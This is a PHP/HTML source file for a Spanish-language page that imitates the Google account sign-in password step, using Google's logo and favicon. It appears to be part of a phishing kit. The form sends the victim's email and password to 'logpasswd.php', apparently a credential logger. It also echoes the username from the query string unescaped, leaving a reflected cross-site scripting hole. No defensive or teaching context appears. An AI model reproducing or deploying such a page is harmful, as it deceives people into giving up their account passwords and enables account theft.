<?php

  if (empty($_GET)) {
    header('Location: email.html');
  } else {
    $username = $_GET['username'];
  }

?>
<html>

<head>
  <meta charset="utf-8">
  <title>Inicia sesión: Cuentas de Google</title>
  <link rel="icon" type="image/png" href="//www.google.com/favicon.ico" />
  <link rel="stylesheet" type="text/css" href="google.css" />
</head>

<body>
  <div class="login-container">
    <div class="login-header">
      <form class="login-form" action="logpasswd.php" method="post">
        <br>
        <br>
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
        <h1>Te damos la Bienvenida</h1>
        <br>
        <input type="email" class="dropemail" name="username" required value="<?php echo $username; ?>">
        <input type="password" name="password" placeholder="Introduce tu contraseña" required>
        <input type="checkbox" name="checkbox" placeholder="">Mostrar contraseña
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div class="div-button">
          <a href="">¿Has olvidado tu contraseña?</a> <button class="next-button" type="submit">Siguiente</button>
        </div>
    </div>
    </form>
    <div class="menu-inferior">
      <div class="language-menu">
        <button class="language-button">
          <span class="language-label">Español (España)</span>
          <svg viewBox="0 0 24 24" class="language-icon">
            <path fill="#000000" d="M7,10L12,15L17,10H7Z" />
          </svg>
        </button>
      </div>
      <span class="separador"></span>
      <span class="nav-inferior">Ayuda</span>
      <span class="nav-inferior">Privacidad</span>
      <span class="nav-inferior">Términos</span>

    </div>
  </div>
  </div>
</body>


</html>